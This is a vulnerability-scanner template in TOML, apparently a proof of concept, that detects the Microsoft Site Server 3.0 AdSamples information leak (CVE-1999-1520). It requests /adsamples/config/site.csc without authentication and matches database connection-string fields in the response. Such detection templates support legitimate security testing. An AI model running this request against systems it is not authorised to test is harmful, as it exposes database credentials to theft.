[info]
author = "ave"
description = "通过 HTTP 请求访问 Microsoft Site Server 3.0 AdSamples 示例目录下的 SITE.CSC 配置文件，检测是否存在 SQL 数据库连接字符串（DSN、用户名、密码）泄露。攻击者无需认证即可读取该文件，获取数据库凭据。"
id = "POC-AVE-1999-1157"
name = "Microsoft Site Server 3.0 AdSamples 敏感信息泄露 PoC"
severity = "medium"
tags = ["ave-1999-1157"]
vuln_id = [
    "CVE-1999-1520",
    "AVE-1999-1157",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/adsamples/config/site.csc"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Provider=",
    "Data Source=",
    "User ID=",
    "Initial Catalog=",
    "site.csc",
]
